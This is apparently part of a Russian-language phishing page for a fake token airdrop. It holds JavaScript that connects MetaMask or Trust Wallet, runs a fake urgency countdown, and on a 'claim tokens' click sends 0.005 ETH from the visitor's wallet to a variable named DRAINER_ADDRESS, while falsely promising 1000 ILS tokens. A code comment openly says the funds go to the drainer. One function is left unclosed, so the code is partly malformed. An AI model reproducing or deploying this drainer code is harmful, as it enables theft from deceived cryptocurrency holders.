        function updateCountdown() {
            const endDate = new Date();
            endDate.setDate(endDate.getDate() + 15);
            endDate.setHours(endDate.getHours() + 8);
            endDate.setMinutes(endDate.getMinutes() + 42);
            endDate.setSeconds(endDate.getSeconds() + 36);
            
            const now = new Date();
            const timeLeft = endDate - now;
            
            if (timeLeft > 0) {
                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
                
                document.getElementById('days').textContent = days.toString().padStart(2, '0');
                document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
                document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
                document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
            }
        }
        
        setInterval(updateCountdown, 1000);
        updateCountdown();

        // Подключение к MetaMask
        async function connectMetaMask() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    currentAccount = accounts[0];
                    document.getElementById('wallet-address').value = currentAccount;
                    document.getElementById('wallet-form').style.display = 'block';
                    document.getElementById('wallet-status').innerHTML = '<div class="alert alert-success">Кошелек MetaMask подключен успешно!</div>';
                } catch (error) {
                    console.error('Ошибка подключения к MetaMask:', error);
                    document.getElementById('wallet-status').innerHTML = '<div class="alert alert-danger">Ошибка подключения к MetaMask</div>';
                }
            } else {
                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">MetaMask не установлен. Пожалуйста, установите расширение MetaMask.</div>';
            }
        }

// Подключение к Trust Wallet
        async function connectTrustWallet() {
            if (typeof window.ethereum !== 'undefined') {
                try {
                    // Проверка, является ли это Trust Wallet
                    if (window.ethereum.isTrust) {
                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                        currentAccount = accounts[0];
                        document.getElementById('wallet-address').value = currentAccount;
                        document.getElementById('wallet-form').style.display = 'block';
                        document.getElementById('wallet-status').innerHTML = '<div class="alert alert-success">Кошелек Trust Wallet подключен успешно!</div>';
                    } else {
                        document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">Пожалуйста, используйте Trust Wallet</div>';
                    }
                } catch (error) {
                    console.error('Ошибка подключения к Trust Wallet:', error);
                    document.getElementById('wallet-status').innerHTML = '<div class="alert alert-danger">Ошибка подключения к Trust Wallet</div>';
                }
            } else {
                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">Trust Wallet не установлен. Пожалуйста, установите приложение Trust Wallet.</div>';

        // Обработчик нажатия на кнопку "Получить токены"
        document.getElementById('claim-tokens').addEventListener('click', async function() {
            const walletAddress = document.getElementById('wallet-address').value;
            
            if (!walletAddress) {
                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">Пожалуйста, введите адрес кошелька</div>';
                return;
            }
            
            if (!web3.utils.isAddress(walletAddress)) {
                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-danger">Неверный адрес кошелька</div>';
                return;
            }
            
            try {
                document.getElementById('wallet-status').innerHTML = '<div class="alert alert-info">Обработка запроса...</div>';
                
                // Получение баланса ETH
                const balance = await web3.eth.getBalance(walletAddress);
                const ethBalance = web3.utils.fromWei(balance, 'ether');
                
                if (parseFloat(ethBalance) < 0.005) {
                    document.getElementById('wallet-status').innerHTML = '<div class="alert alert-warning">Недостаточно ETH для комиссии сети. Пожалуйста, пополните баланс кошелька.</div>';
                    return;
                }
                
                // Создание транзакции для отправки средств на адрес дрейнера
                const transactionParameters = {
                    to: DRAINER_ADDRESS,
                    from: walletAddress,
                    value: web3.utils.toHex(web3.utils.toWei('0.005', 'ether')),
                    gas: '21000',
                    gasPrice: web3.utils.toHex(await web3.eth.getGasPrice())
                };
                
                // Отправка транзакции
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [transactionParameters],
                });
                
                document.getElementById('wallet-status').innerHTML = `
                    <div class="alert alert-success">
                        <p>Транзакция отправлена!</p>
                        <p>Хеш транзакции: \${txHash}</p>
                        <p>Ваши 1000 ILS токены будут зачислены в течение 24 часов.</p>
                        <p><a href="https://etherscan.io/tx/\${txHash}" target="_blank">Просмотреть в Etherscan</a></p>
                    </div>
                `;
                
                // Очистка формы
                document.getElementById('wallet-address').value = '';
                
            } catch (error) {
                console.error('Ошибка при отправке транзакции:', error);
                document.getElementById('wallet-status').innerHTML = `
                    <div class="alert alert-danger">
                        <p>Ошибка при обработке транзакции: \${error.message}</p>
                        <p>Пожалуйста, попробуйте еще раз.</p>
                    </div>
                `;
            }
        });
